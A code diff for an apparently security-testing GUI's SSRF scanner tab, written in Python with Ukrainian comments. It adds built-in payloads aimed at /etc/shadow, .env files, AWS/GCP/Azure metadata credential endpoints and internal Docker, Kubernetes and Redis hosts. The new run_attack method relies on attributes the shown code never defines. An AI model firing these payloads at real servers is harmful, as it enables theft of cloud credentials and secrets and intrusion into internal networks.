@@ -1,31 +1,39 @@
 # xss_security_gui/ssrf_tab.py
-
 import json
 import os
 import tkinter as tk
+from datetime import datetime, timezone
 from tkinter import ttk, messagebox, filedialog
 from typing import Any, Dict, List
 
 from xss_security_gui.settings import settings
 from xss_security_gui.threat_analysis.ssrf_module import SSRFTester
+from xss_security_gui.utils.threat_sender import normalize_threat_artifact, emit_threat_event
 
 
 class SSRFTab(ttk.Frame):
     """
-    SSRFTab (ULTRA Hybrid 6.5+)
-    ---------------------------
+    SSRFTab ULTRA 7.0 Pro
+    ---------------------
     • Гнучке завантаження payload-файлу (settings / аргумент / дефолт)
     • Потокобезпечний лог (через .after)
     • Кольорові теги (HIGH / INFO / ERROR)
     • Контроль потоків (active_tests, max_workers)
-    • Уніфікований формат результатів (TesterBase + Threat Intel)
-    • Стабільність GUI навіть при помилках
+    • Розширені SSRF payload-и:
+        - file:// (локальні файли, .env, /etc/passwd)
+        - AWS/GCP/Azure metadata
+        - Docker / Kubernetes / internal services
+    • ThreatConnector 7.0 (normalize_threat_artifact + emit_threat_event)
+    • Уніфікований формат результатів для cross‑module heatmap + timeline
     """
 
-    def __init__(self, parent, url: str, payload_file: str | None = None) -> None:
+    def __init__(self, parent, url: str | None = None, payload_file=None):
         super().__init__(parent)
 
-        self.url = url
+        # 🔥 Захист від падіння, якщо URL не передали
+        self.url = url or "http://127.0.0.1"
+
+        self.payload_file = payload_file
         self.loop_running = False
         self.active_tests = 0
         self.max_workers = 5
@@ -39,12 +47,18 @@ class SSRFTab(ttk.Frame):
         self.payload_file: str = payload_file or default_file
         self.payloads: Dict[str, List[str]] = self._load_payloads()
 
+        # === UIQueueBridge для фоновых операций ===
+        from xss_security_gui.utils.ui_queue_bridge import UIQueueBridge
+        self._bridge = UIQueueBridge(self, poll_ms=50)
+
         self._build_ui()
 
     # ---------------------------------------------------------
-    # Payload loader
+    # Payload loader + enrichment
     # ---------------------------------------------------------
     def _load_payloads(self) -> Dict[str, List[str]]:
+        base: Dict[str, List[str]] = {}
+
         try:
             with open(self.payload_file, "r", encoding="utf-8") as f:
                 data = json.load(f)
@@ -52,17 +66,60 @@ class SSRFTab(ttk.Frame):
             if not isinstance(data, dict):
                 raise ValueError("Файл payload-ів повинен містити JSON-об'єкт з категоріями")
 
-            normalized: Dict[str, List[str]] = {}
             for k, v in data.items():
                 if isinstance(v, list):
-                    normalized[k] = v
+                    base[k] = v
                 else:
-                    normalized[k] = [str(v)]
-            return normalized
-
+                    base[k] = [str(v)]
         except Exception as e:
             messagebox.showerror("Помилка", f"Не вдалося завантажити SSRF payload-и:\n{e}")
-            return {}
+            base = {}
+
+        # Додаємо Pro-набір
+        pro = self._build_pro_payloads()
+        for cat, lst in pro.items():
+            base.setdefault(cat, [])
+            for p in lst:
+                if p not in base[cat]:
+                    base[cat].append(p)
+
+        return base
+
+    def _build_pro_payloads(self) -> Dict[str, List[str]]:
+        """Додає Pro-набір SSRF payload-ів (file://, metadata, internal)."""
+        return {
+            "file_env": [
+                "file:///var/www/html/.env",
+                "file:///var/www/app/.env",
+                "file:///var/www/.env",
+                "file:///home/www-data/.env",
+                "file:///.env",
+            ],
+            "file_passwd": [
+                "file:///etc/passwd",
+                "file:///etc/shadow",
+            ],
+            "aws_metadata": [
+                "http://169.254.169.254/latest/meta-data/",
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            ],
+            "gcp_metadata": [
+                "http://metadata.google.internal/computeMetadata/v1/",
+            ],
+            "azure_metadata": [
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            ],
+            "docker_internal": [
+                "http://docker.for.win.localhost/",
+                "http://host.docker.internal/",
+            ],
+            "kubernetes_internal": [
+                "https://kubernetes.default.svc/",
+            ],
+            "redis_internal": [
+                "redis://127.0.0.1:6379/",
+            ],
+        }
 
     # ---------------------------------------------------------
     # UI builder
@@ -222,17 +279,21 @@ class SSRFTab(ttk.Frame):
         else:
             selected_payloads = {category: self.payloads.get(category, [])}
 
-        tester = SSRFTester(
-            base_url=self.url,
-            param=param,
-            base_value=base_value,
-            payloads=selected_payloads,
-            output_callback=self._on_test_finish,
-        )
-        tester.start()
+        self._safe_log(f"🚀 Запущено SSRF-тестування для {self.url} (param={param})\n")
         self.active_tests += 1
 
-        self._safe_log(f"🚀 Запущено SSRF-тестування для {self.url} (param={param})\n")
+        # Запускаємо в фоне через UIQueueBridge
+        def worker():
+            tester = SSRFTester(
+                base_url=self.url,
+                param=param,
+                base_value=base_value,
+                payloads=selected_payloads,
+                output_callback=self._on_test_finish,
+            )
+            tester.start()
+
+        self._bridge.post_bg(worker)
 
     # ---------------------------------------------------------
     # Loop mode
@@ -299,6 +360,42 @@ class SSRFTab(ttk.Frame):
         )
         return True
 
+    def run_attack(self, url: str) -> Dict[str, Any]:
+        """
+        Запускає одну SSRF‑атаку і повертає артефакт:
+        - category: ssrf_candidate
+        - url: атакований URL
+        - final_host: кінцевий хост
+        - internal_port_scan: список портів
+        """
+        if not self._tester:
+            self._tester = self._build_tester()
+
+        self._attack_counter += 1
+        attack_label = f"Attack #{self._attack_counter}"
+
+        self.log(f"\n=== ⚡ {attack_label} → {url} ===\n", "INFO")
+
+        # тут реальний SSRF через SSRFTester
+        result = self._tester._run_test(url)
+
+        result["category"] = "ssrf_candidate"
+        result["action"] = "ssrf_attack"
+        result["url"] = url
+        result["payload_meta"] = {
+            "attack_label": attack_label,
+            "payload_value": url,
+        }
+        result["timestamp"] = datetime.now(timezone.utc).isoformat()
+
+        severity = result.get("severity", "INFO").upper()
+        if severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}:
+            result["risk"] = severity.lower()
+        else:
+            result["risk"] = "info"
+
+        return result
+
     # ---------------------------------------------------------
     # Callback from tester
     # ---------------------------------------------------------
@@ -307,14 +404,14 @@ class SSRFTab(ttk.Frame):
         self.display_result(result)
 
     # ---------------------------------------------------------
-    # Display result
+    # Display result + ThreatConnector
     # ---------------------------------------------------------
     def display_result(self, result: Dict[str, Any]) -> None:
         if not result:
             self._safe_log("⚠️ Порожній результат від SSRFTester\n")
             return
 
-        details = result.get("details", {})
+        details = result.get("details", {}) or {}
         severity = result.get("severity") or details.get("severity") or "INFO"
 
         category = result.get("category", "?")
@@ -325,6 +422,7 @@ class SSRFTab(ttk.Frame):
         redirected_to_local = details.get("redirected_to_local", False)
         body_hit = details.get("body_hit", False)
         header_hit = details.get("header_hit", False)
+        raw = details.get("raw") or ""
 
         len_part = f"(len={resp_len})" if isinstance(resp_len, (int, float)) else ""
 
@@ -337,10 +435,31 @@ class SSRFTab(ttk.Frame):
         tag = "HIGH" if severity == "HIGH" else ("ERROR" if severity == "ERROR" else "INFO")
         self._safe_log((line, tag))
 
-        if self.verbose_var.get():
-            raw = details.get("raw")
-            if raw:
-                self._safe_log((f"RAW: {raw[:500]}\n", tag))
+        if self.verbose_var.get() and raw:
+            self._safe_log((f"RAW: {raw[:500]}\n", tag))
+
+        # Threat artifact
+        artifact: Dict[str, Any] = {
+            "type": "SSRF",
+            "module": "ssrf_tab",
+            "url": self.url,
+            "param": self.param_entry.get().strip(),
+            "payload": payload,
+            "category": category,
+            "severity": severity,
+            "http_status": http_status,
+            "response_length": resp_len,
+            "redirected_to_local": redirected_to_local,
+            "body_hit": body_hit,
+            "header_hit": header_hit,
+            "source": "SSRF Scanner Pro",
+        }
+
+        try:
+            norm = normalize_threat_artifact(artifact)
+            emit_threat_event(norm)
+        except Exception as e:
+            self._safe_log(f"[ThreatConnector] Помилка нормалізації/відправки: {e}\n")
 
     # ---------------------------------------------------------
     # Clear output
